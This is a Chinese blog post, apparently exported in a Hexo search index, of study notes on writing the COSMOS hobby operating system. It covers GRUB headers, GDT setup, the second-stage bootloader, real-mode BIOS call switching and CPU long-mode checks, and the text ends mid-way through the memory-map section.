<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>COSMOS 设置工作模式与环境</title>
      <link href="/2024/05/22/COSMOS-%E8%AE%BE%E7%BD%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E4%B8%8E%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/05/22/COSMOS-%E8%AE%BE%E7%BD%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E4%B8%8E%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间一直在学习写操作系统，看了网上LMOS老师的课，梳理一下第10到12课所学的知识，重点是对代码流程的简单描述，并对课程内容我个人之前不清楚的地方做简要补充记录，以供后面查找。</p><h1 id="实现GRUB头"><a href="#实现GRUB头" class="headerlink" title="实现GRUB头"></a>实现GRUB头</h1><h2 id="首先先看两个结构体"><a href="#首先先看两个结构体" class="headerlink" title="首先先看两个结构体"></a>首先先看两个结构体</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//映像文件头描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_mlosrddsc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_mgic; <span class="comment">//映像文件标识</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfsum;<span class="comment">//未使用</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfsoff;<span class="comment">//未使用</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfeoff;<span class="comment">//未使用</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfrlsz;<span class="comment">//未使用</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_s;<span class="comment">//映像文件中二级引导器的开始偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_e;<span class="comment">//映像文件中二级引导器的结束偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_rsz;<span class="comment">//映像文件中二级引导器的实际大小</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_sum;<span class="comment">//映像文件中二级引导器的校验和</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_s;<span class="comment">//映像文件中文件头描述的开始偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_e;<span class="comment">//映像文件中文件头描述的结束偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_rsz;<span class="comment">//映像文件中文件头描述的实际大小</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_sum;<span class="comment">//映像文件中文件头描述的校验和</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_s;<span class="comment">//映像文件中文件数据的开始偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_e;<span class="comment">//映像文件中文件数据的结束偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_rsz;<span class="comment">//映像文件中文件数据的实际大小</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_sum;<span class="comment">//映像文件中文件数据的校验和</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrcodenr;<span class="comment">//映像文件中二级引导器的文件头描述符的索引号</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdnr;<span class="comment">//映像文件中文件头描述符有多少个</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filnr;<span class="comment">//映像文件中文件头有多少个</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_endgic;<span class="comment">//映像文件结束标识</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_rv;<span class="comment">//映像文件版本</span></span><br><span class="line">&#125;<span class="keyword">mlosrddsc_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_fhdsc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_type;<span class="comment">//文件类型</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_subtype;<span class="comment">//文件子类型</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_stuts;<span class="comment">//文件状态</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_id;<span class="comment">//文件id</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_intsfsoff;<span class="comment">//文件在映像文件位置开始偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_intsfend;<span class="comment">//文件在映像文件的结束偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_frealsz;<span class="comment">//文件实际大小</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_fsum;<span class="comment">//文件校验和</span></span><br><span class="line">    <span class="keyword">char</span>   fhd_name[FHDSC_NMAX];<span class="comment">//文件名</span></span><br><span class="line">&#125;<span class="keyword">fhdsc_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这两个结构体由<em>lmoskrlimg</em>写入，后面如何打包起来这里先不谈，我们现在只需要知道这是直接写好在文件中直接映射到内存的，我们只需要在代码中写入映像文件头描述符的地址即可</p><h2 id="GRUB头"><a href="#GRUB头" class="headerlink" title="GRUB头"></a>GRUB头</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MBT_HDR_FLAGSEQU 0x00010003;flag字段，指出OS映像需要引导程序提供或支持的特性</span><br><span class="line">MBT_HDR_MAGICEQU 0x1BADB002;多引导协议头魔数</span><br><span class="line">MBT2_MAGICEQU 0xe85250d6;第二版多引导协议头魔数</span><br><span class="line">global _start;导出_start符号</span><br><span class="line">extern inithead_entry;导入外部的inithead_entry函数符号</span><br><span class="line">[section .text];定义.text代码节</span><br><span class="line">[bits 32];汇编成32位代码</span><br><span class="line">_start:</span><br><span class="line">jmp _entry</span><br><span class="line">align 4</span><br><span class="line">mbt_hdr:</span><br><span class="line">dd MBT_HDR_MAGIC</span><br><span class="line">dd MBT_HDR_FLAGS</span><br><span class="line">dd -(MBT_HDR_MAGIC+MBT_HDR_FLAGS)</span><br><span class="line">dd mbt_hdr</span><br><span class="line">dd _start</span><br><span class="line">dd 0</span><br><span class="line">dd 0</span><br><span class="line">dd _entry</span><br><span class="line">;以上是GRUB所需要的头</span><br><span class="line">ALIGN 8</span><br><span class="line">mbhdr:</span><br><span class="line">DD0xE85250D6</span><br><span class="line">DD0</span><br><span class="line">DDmhdrend - mbhdr</span><br><span class="line">DD-(0xE85250D6 + 0 + (mhdrend - mbhdr))</span><br><span class="line">DW2, 0</span><br><span class="line">DD24</span><br><span class="line">DDmbhdr</span><br><span class="line">DD_start</span><br><span class="line">DD0</span><br><span class="line">DD0</span><br><span class="line">DW3, 0</span><br><span class="line">DD12</span><br><span class="line">DD_entry </span><br><span class="line">DD      0  </span><br><span class="line">DW0, 0</span><br><span class="line">DD8</span><br><span class="line">mhdrend:</span><br><span class="line">;以上是GRUB2所需要的头</span><br></pre></td></tr></table></figure><p>上面的数据既是GRUB，，这部分基本上是固定的，不过是提供给grub和grub2所需要到的头让其识别罢了，我们可以看到上面的start函数跳转到entry函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_entry:</span><br><span class="line">    ;关中断</span><br><span class="line">cli</span><br><span class="line">    ;关不可屏蔽中断</span><br><span class="line">in al, 0x70</span><br><span class="line">or al, 0x80</span><br><span class="line">out 0x70,al</span><br><span class="line">    ;重新加载GDT</span><br><span class="line">lgdt [GDT_PTR]</span><br><span class="line">jmp dword 0x8 :_32bits_mode</span><br></pre></td></tr></table></figure><p>entry函数的目的是关闭中断并加载加载GDT地址到GDTR寄存器,下面的数据就是GDT，是段描述符表，这里就不详细展开了，注释有简单解释</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0;一个空描述符，用于保护模式下的错误检查。</span><br><span class="line">kcode_dsc: dq 0x00cf9e000000ffff;32位代码段描述符，访问位 a-e</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff;32位数据段描述符。</span><br><span class="line">k16cd_dsc: dq 0x00009e000000ffff;16位代码段描述符，访问位 a-e</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff;16位数据段描述符</span><br><span class="line">GDT_END:</span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLENdw GDT_END-GDT_START-1;GDT界限</span><br><span class="line">GDTBASEdd GDT_START;GDT 的基地址</span><br></pre></td></tr></table></figure><p>上面的entry做完其任务后又跳转到32bits_mode函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_32bits_mode:</span><br><span class="line">;下面初始化C语言可能会用到的寄存器</span><br><span class="line">mov ax, 0x10; 数据段选择子(目的)，0000 0000 0001 0000，索引为2，32位数据段描述符</span><br><span class="line">mov ds, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov fs, ax</span><br><span class="line">mov gs, ax</span><br><span class="line">xor eax,eax</span><br><span class="line">xor ebx,ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor edi,edi</span><br><span class="line">xor esi,esi</span><br><span class="line">xor ebp,ebp</span><br><span class="line">xor esp,esp</span><br><span class="line">    ;初始化栈，C语言需要栈才能工作</span><br><span class="line">mov esp,0x7c00</span><br><span class="line">    ;调用C语言函数inithead_entry</span><br><span class="line">call inithead_entry</span><br><span class="line">jmp 0x200000;inithead_entry在inithead_entry导入的initldrkrl.bin</span><br></pre></td></tr></table></figure><p>32bits_mode将段寄存器的段寄存器内的选择子索引指向的设置到32位数据段描述符上，并初始化寄存器还有栈，为后面调用C函数做铺垫，我们先来简单看看inithead_entry函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inithead_entry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    init_curs();<span class="comment">//初始化cursor_t结构体</span></span><br><span class="line">    close_curs();<span class="comment">//关闭光标</span></span><br><span class="line">    clear_screen(VGADP_DFVL);<span class="comment">//清除屏幕</span></span><br><span class="line">    write_realintsvefile(); </span><br><span class="line">    write_ldrkrlfile(); </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其主要作用是,清楚屏幕，然后找到inithead.bin，initldrkrl.bin的文件头描述符,并将其从映像文件中加载到其应该去的地址。其中<code>write_ldrkrlfile();</code>函数将二级引导器主模块加载到了0x200000的地址，以供上面的32bits_mode跳转到该模块。</p><h1 id="进入二级引导器"><a href="#进入二级引导器" class="headerlink" title="进入二级引导器"></a>进入二级引导器</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%include &quot;ldrasm.inc&quot;</span><br><span class="line">global _start</span><br><span class="line">global realadr_call_entry</span><br><span class="line">global IDT_PTR</span><br><span class="line">extern ldrkrl_entry</span><br><span class="line">[section .text]</span><br><span class="line">[bits 32]</span><br><span class="line">_start:</span><br><span class="line">_entry:</span><br><span class="line">cli</span><br><span class="line">lgdt [GDT_PTR];加载GDTR寄存器，GDT 是一个数据结构，包含了各种段描述符，例如代码段、数据段、系统段等。每个描述符定义了一个内存段的属性，如基地址、段限制、特权级等。</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Base Address  (32 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Limit         (16 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line"></span><br><span class="line">lidt [IDT_PTR];加载IDTR寄存器，IDT 是一个数据结构，包含了中断和异常处理程序的入口地址。每个中断或异常对应一个描述符，其中包含了处理程序的地址和特权级。</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Base Address  (32 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Limit         (16 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">jmp dword 0x8 :_32bits_mode</span><br><span class="line"></span><br><span class="line">_32bits_mode:</span><br><span class="line">mov ax, 0x10; 数据段选择子(目的)，0000 0000 0001 0000，索引为2，32位数据段描述符</span><br><span class="line">mov ds, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov fs, ax</span><br><span class="line">mov gs, ax</span><br><span class="line">xor eax,eax</span><br><span class="line">xor ebx,ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor edi,edi</span><br><span class="line">xor esi,esi</span><br><span class="line">xor ebp,ebp</span><br><span class="line">xor esp,esp</span><br><span class="line">mov esp,0x90000</span><br><span class="line">call ldrkrl_entry</span><br><span class="line">xor ebx,ebx</span><br><span class="line">jmp 0x2000000</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">realadr_call_entry:</span><br><span class="line">pushad</span><br><span class="line">push    ds</span><br><span class="line">push    es</span><br><span class="line">push    fs</span><br><span class="line">push    gs</span><br><span class="line">call save_eip_jmp</span><br><span class="line">popgs</span><br><span class="line">popfs</span><br><span class="line">popes</span><br><span class="line">popds</span><br><span class="line">popad</span><br><span class="line">ret</span><br><span class="line">save_eip_jmp:</span><br><span class="line">pop esi ;此时栈底是储存的是call指令执行时保存的eip既&quot;pop gs&quot;这条指令的地址</span><br><span class="line">mov [PM32_EIP_OFF],esi;保存eip</span><br><span class="line">mov [PM32_ESP_OFF],esp;保存esp</span><br><span class="line">jmp dword far [cpmty_mode] ;长跳转这里表示把cpmty_mode处的第一个4字节装入eip，把其后的2字节装入cs，跳转到的代码文件在realintsve.asm</span><br><span class="line">cpmty_mode:</span><br><span class="line">dd 0x1000;EIP</span><br><span class="line">dw 0x18;CS 0000 0000 0001 1000,最后三位是RPL和TI，都为0 ，索引是3，;16位代码段描述符，访问位 a-e</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0;一个空描述符，用于保护模式下的错误检查。</span><br><span class="line">kcode_dsc: dq 0x00cf9a000000ffff ;32位代码段描述符，访问位 a-e</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff ;32位数据段描述符。</span><br><span class="line">k16cd_dsc: dq 0x00009a000000ffff ;16位代码段描述符，访问位 a-e</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff ;16位数据段描述符</span><br><span class="line">GDT_END:</span><br><span class="line"></span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLENdw GDT_END-GDT_START-1;GDT界限</span><br><span class="line">GDTBASEdd GDT_START ;GDT 的基地址</span><br><span class="line"></span><br><span class="line">IDT_PTR:</span><br><span class="line">IDTLENdw 0x3ff; IDT 的长度，这里设置为 0x3ff，即 1023。</span><br><span class="line">IDTBASdd 0; IDT 的基地址，这里设置为 0，这是BIOS中断表的地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上文件的start函数就是之前要跳转的位置，这个文件主要干的内容和之前一样，就是对各个寄存器，以及堆栈进行初始化跳转到ldrkrl_entry函数，这里先不谈ldrkrl_entry函数，这个ldrkrl_entry是二级引导器的主函数，我们先来看看后面的部分，因为后面这些功能是为我们主函数服务的，因为我们要调用bios中断，C语言代码工作在32位保护模式，要调用bios要使用实模式，所以我们要先实现一个realadr_call_entry函数来帮助我们的主函数去调用bios中断。</p><h1 id="realadr-call-entry函数"><a href="#realadr-call-entry函数" class="headerlink" title="realadr_call_entry函数"></a>realadr_call_entry函数</h1><p>我们先看看realadr_call_entry函数在c里的定义<code>void REGCALL realadr_call_entry(u16_t callint,u16_t val1,u16_t val2);//eax edx ecx</code>其中<strong>REGCALL</strong>是一个宏定义<code>#define REGCALL __attribute__((regparm(3)))//表示会用 3 个寄存器来传递参数（EAX、EDX 和 ECX），其余的参数通过堆栈来传递。</code>，也就是说当我们调用realadr_call_entry函数的时候会将三个参数传递到寄存器中，这点很重要，我们都知道汇编语言的函数是没有传参的说法的，这里的操作重点是改变EAX、EDX 和 ECX三个寄存器，通过比对不同的eax寄存器的值来跳转到不同的函数，我们下面来看看这一过程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">realadr_call_entry:</span><br><span class="line">pushad</span><br><span class="line">push    ds</span><br><span class="line">push    es</span><br><span class="line">push    fs</span><br><span class="line">push    gs</span><br><span class="line">call save_eip_jmp</span><br><span class="line">popgs</span><br><span class="line">popfs</span><br><span class="line">popes</span><br><span class="line">popds</span><br><span class="line">popad</span><br><span class="line">ret</span><br><span class="line">save_eip_jmp:</span><br><span class="line">pop esi ;此时栈底是储存的是call指令执行时保存的eip既&quot;pop gs&quot;这条指令的地址</span><br><span class="line">mov [PM32_EIP_OFF],esi;保存eip</span><br><span class="line">mov [PM32_ESP_OFF],esp;保存esp</span><br><span class="line">jmp dword far [cpmty_mode] ;长跳转这里表示把cpmty_mode处的第一个4字节装入eip，把其后的2字节装入cs，跳转到的代码文件在realintsve.asm</span><br><span class="line">cpmty_mode:</span><br><span class="line">dd 0x1000;EIP</span><br><span class="line">dw 0x18;CS 0000 0000 0001 1000,最后三位是RPL和TI，都为0 ，索引是3，;16位代码段描述符，访问位 a-e</span><br><span class="line">jmp $</span><br></pre></td></tr></table></figure><p>realadr_call_entry保存段寄存器后，跳转到了save_eip_jmp，当我们使用call指令后会将返回后要跳转的地址压入栈中，这里我们保存这一地址，并保留其堆栈地址，然后通过长跳转跳转到16位代码段描述符所记录的段，详细到段内地址是偏移0x1000的地址，关于这个地址的代码就像下图所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%include &quot;ldrasm.inc&quot;</span><br><span class="line">global _start</span><br><span class="line">[section .text]</span><br><span class="line">[bits 16]</span><br><span class="line">_start:</span><br><span class="line">_16_mode:</span><br><span class="line">    mov bp, 0x20 ;0000 0000 0010 0000，索引为4，16位数据段描述符</span><br><span class="line">    mov ds, bp</span><br><span class="line">    mov es, bp</span><br><span class="line">    mov ss, bp</span><br><span class="line">    mov ebp, cr0</span><br><span class="line">    and ebp, 0xfffffffe</span><br><span class="line">    mov cr0, ebp ;CR0.P=0 关闭保护模式</span><br><span class="line">    jmp 0:real_entry ;刷新CS影子寄存器，真正进入实模式</span><br><span class="line">real_entry:</span><br><span class="line">    mov bp,cs</span><br><span class="line">    mov ds, bp</span><br><span class="line">    mov es, bp</span><br><span class="line">    mov ss, bp</span><br><span class="line">    mov sp, 08000h ;设置栈顶</span><br><span class="line">    mov bp, func_table</span><br><span class="line">    add bp, ax</span><br><span class="line">    call [bp] ;调用函数表中的汇编函数，ax是C函数(使用realadr_call_entry符号传递参数)中传递进来的，根据不同的eax来控制调用不同函数</span><br><span class="line">    cli</span><br><span class="line">    call disable_nmi</span><br><span class="line">    mov ebp, cr0</span><br><span class="line">    or ebp, 1</span><br><span class="line">    mov cr0, ebp ;CR0.P=1 开启保护模式</span><br><span class="line">    jmp dword 0x8 : _32bits_mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[bits 32]</span><br><span class="line">_32bits_mode:</span><br><span class="line">    mov bp, 0x10;0000 0000 0001 0000，索引为2，32位数据段描述符</span><br><span class="line">    mov ds, bp</span><br><span class="line">    mov ss, bp ;重新设置保护模式下的段寄存器为32位数据段描述符</span><br><span class="line">mov esi,[PM32_EIP_OFF]</span><br><span class="line">mov esp,[PM32_ESP_OFF]</span><br><span class="line">jmp esi</span><br><span class="line"></span><br><span class="line">func_table: ;函数表，每项占两个字节</span><br><span class="line">dw _getmmap;获取内存布局视图的函数</span><br><span class="line">dw _read ;读取硬盘的函数</span><br><span class="line">    dw _getvbemode ;获取显卡VBE模式</span><br><span class="line">    dw _getvbeonemodeinfo ;获取显卡VBE模式的数据</span><br><span class="line">    dw _setvbemode ;设置显卡VBE模式</span><br></pre></td></tr></table></figure><p>这段代码省去了要跳转的几个函数的功能实现，其实这几个代码的功能都是从bios中断中获取数据最后保存起来。我们先来看看上面的部分，依旧是设定段选择子到16位数据段描述符，然后关闭保护模式进入实模式，也就是real_entry的部分，最为重点的是<code>call [bp] ;</code>这段代码，这里通过先将func_table的地址传入bp寄存器，然后因为传入的ax不同，<code>add bp, ax</code>的结果不同，通过这样的方式来告诉real_entry函数后面进入哪个函数。调用完函数会回到real_entry，然后关中断开启保护模式，重新设置寄存器，回到之前的位置，也就是realadr_call_entry的<code>pop     gs</code>这一行。</p><h1 id="init-bstartparm函数"><a href="#init-bstartparm函数" class="headerlink" title="init_bstartparm函数"></a>init_bstartparm函数</h1><p>我们接下来就要完善上面提到的ldrkrl_entry函数了，如果 ldrkrl_entry() 函数是总裁，那么 init_bstartparm() 函数则是经理，它负责管理检查 CPU 模式、收集内存信息，设置内核栈，设置内核字体、建立内核 MMU 页表数据。下面我们直接来看init_bstartparm函数的实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_bstartparm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">machbstart_t</span>* mbsp = MBSPADR;<span class="comment">//1MB的内存地址</span></span><br><span class="line">    machbstart_t_init(mbsp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们要先在0x100000的地址初始化了一个机器信息结构 machbstart_t用于储存我们的信息</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">machbstart_t_init</span><span class="params">(<span class="keyword">machbstart_t</span>* initp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(initp,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">machbstart_t</span>));</span><br><span class="line">    initp-&gt;mb_migc=MBS_MIGC;<span class="comment">//设置魔数</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面我们在该函数中加入各种收集信息的函数。</p><h2 id="检测cpu是否支持"><a href="#检测cpu是否支持" class="headerlink" title="检测cpu是否支持"></a>检测cpu是否支持</h2><p>再开始收集信息之前我们先对cpu进行一个检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_chkcpu</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!chk_cpuid())<span class="comment">//检测cpuid功能是否支持</span></span><br><span class="line">    &#123;</span><br><span class="line">        kprint(<span class="string">&quot;Your CPU is not support CPUID sys is die!&quot;</span>);</span><br><span class="line">        CLI_HALT();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!chk_cpu_longmode())<span class="comment">//检测是否支持长模式</span></span><br><span class="line">    &#123;</span><br><span class="line">        kprint(<span class="string">&quot;Your CPU is not support 64bits mode sys is die!&quot;</span>);</span><br><span class="line">        CLI_HALT();</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_cpumode = <span class="number">64</span>;<span class="comment">//如果成功则设置机器信息结构的cpu模式为64位</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过改写EFLAGS寄存器的第21位，观察其位的变化判断是否支持CPUID,具体过程下面都有注释</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chk_cpuid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rets = <span class="number">0</span>;</span><br><span class="line">    __asm__ __volatile__(<span class="comment">//__volatile__确保每次访问该变量时都直接从内存中读取或写入值，而不是从寄存器或其他缓存中获取。</span></span><br><span class="line">        <span class="string">&quot;pushfl \n\t&quot;</span><span class="comment">//EFLAGS寄存器压栈</span></span><br><span class="line">        <span class="string">&quot;pop %%eax \n\t&quot;</span><span class="comment">//将EFLAGS保存到eax中</span></span><br><span class="line">        <span class="string">&quot;movl %%eax,%%ebx \n\t&quot;</span><span class="comment">//将EAX寄存器的值复制到EBX寄存器中，用于之后的比较</span></span><br><span class="line">        <span class="string">&quot;xorl $0x0200000,%%eax \n\t&quot;</span><span class="comment">//对EAX寄存器的值进行异或操作，改变其第21位的值</span></span><br><span class="line">        <span class="string">&quot;pushl %%eax \n\t&quot;</span><span class="comment">//将修改后的EAX值压回栈中</span></span><br><span class="line">        <span class="string">&quot;popfl \n\t&quot;</span><span class="comment">//将栈顶的值弹出到EFLAGS寄存器中，更新EFLAGS的值</span></span><br><span class="line">        <span class="string">&quot;pushfl \n\t&quot;</span><span class="comment">//再次将EFLAGS的值压入栈中</span></span><br><span class="line">        <span class="string">&quot;popl %%eax \n\t&quot;</span><span class="comment">//将栈顶的值弹出到EAX寄存器中</span></span><br><span class="line">        <span class="string">&quot;xorl %%ebx,%%eax \n\t&quot;</span><span class="comment">//将EBX和EAX寄存器的值进行异或操作，用于检测EFLAGS的第21位是否发生了变化</span></span><br><span class="line">        <span class="string">&quot;jz 1f \n\t&quot;</span><span class="comment">//如果结果为0（即第21位没有变化），跳转到标签1</span></span><br><span class="line">        <span class="string">&quot;movl $1,%0 \n\t&quot;</span><span class="comment">//给rets赋值为0</span></span><br><span class="line">        <span class="string">&quot;jmp 2f \n\t&quot;</span><span class="comment">//跳转到2标签</span></span><br><span class="line">        <span class="string">&quot;1:movl $0,%0 \n\t&quot;</span><span class="comment">//给rets赋值为1</span></span><br><span class="line">        <span class="string">&quot;2: \n\t&quot;</span><span class="comment">//</span></span><br><span class="line">        :<span class="string">&quot;=c&quot;</span>(rets)</span><br><span class="line">        :</span><br><span class="line">        :</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> rets;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再检查CPU是否支持长模式</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chk_cpu_longmode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rets = <span class="number">0</span>; <span class="comment">// 定义一个变量rets，用来存储检测结果，初始化为0</span></span><br><span class="line">    __asm__ __volatile__(</span><br><span class="line">        <span class="string">&quot;movl $0x80000000,%%eax \n\t&quot;</span> <span class="comment">// 将0x80000000移动到EAX寄存器中</span></span><br><span class="line">        <span class="string">&quot;cpuid \n\t&quot;</span> <span class="comment">// 执行CPUID指令，CPUID指令会根据EAX寄存器的值返回不同的信息，当EAX为0x80000000时，执行CPUID指令后，EAX寄存器会返回一个值，这个值是CPU支持的最大扩展功能号。如果这个返回值大于0x80000000，那么就表示CPU支持一系列扩展功能</span></span><br><span class="line">        <span class="string">&quot;cmpl $0x80000001,%%eax \n\t&quot;</span> <span class="comment">// 比较EAX寄存器的值和0x80000001，如果EAX小于0x80000001，那么处理器不支持0x80000001号功能</span></span><br><span class="line">        <span class="string">&quot;setnb %%al \n\t&quot;</span> <span class="comment">// Set Byte if Not Below（如果不低于则设置字节），如果EAX大于或等于0x80000001，将AL设置为1</span></span><br><span class="line">        <span class="string">&quot;jb 1f \n\t&quot;</span> <span class="comment">// 如果EAX小于0x80000001，跳转到标签1</span></span><br><span class="line">        <span class="string">&quot;movl $0x80000001,%%eax \n\t&quot;</span> <span class="comment">// 将0x80000001移动到EAX寄存器中</span></span><br><span class="line">        <span class="string">&quot;cpuid \n\t&quot;</span> <span class="comment">// 再次执行CPUID指令，这次CPUID调用是为了获取扩展功能信息</span></span><br><span class="line">        <span class="string">&quot;bt $29,%%edx \n\t&quot;</span> <span class="comment">// 检查EDX寄存器的第29位（长模式支持位），如果第29位为1，表示支持长模式</span></span><br><span class="line">        <span class="string">&quot;setcb %%al \n\t&quot;</span> <span class="comment">// 如果第29位为1，将AL设置为1</span></span><br><span class="line">        <span class="string">&quot;1: \n\t&quot;</span> <span class="comment">// 标签1</span></span><br><span class="line">        <span class="string">&quot;movzx %%al,%%eax \n\t&quot;</span> <span class="comment">// 将AL的值扩展到EAX寄存器中</span></span><br><span class="line">        : <span class="string">&quot;=a&quot;</span>(rets)</span><br><span class="line">        : </span><br><span class="line">        : </span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> rets; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果以上检测都通过了，就在上面的machbstart_t信息结构中填入cpu模式为64</p><h2 id="获取内存布局"><a href="#获取内存布局" class="headerlink" title="获取内存布局"></a>获取内存布局</h2><p>我们先来了解一下要获得的信息如何储存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_USABLE 1 <span class="comment">//可用内存</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_RESERV 2 <span class="comment">//保留内存不可使用</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_ACPIREC 3 <span class="comment">//ACPI表相关的</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_ACPINVS 4 <span class="comment">//ACPI NVS空间</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_AREACON 5 <span class="comment">//包含坏内存</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_e820</span>&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> saddr;    <span 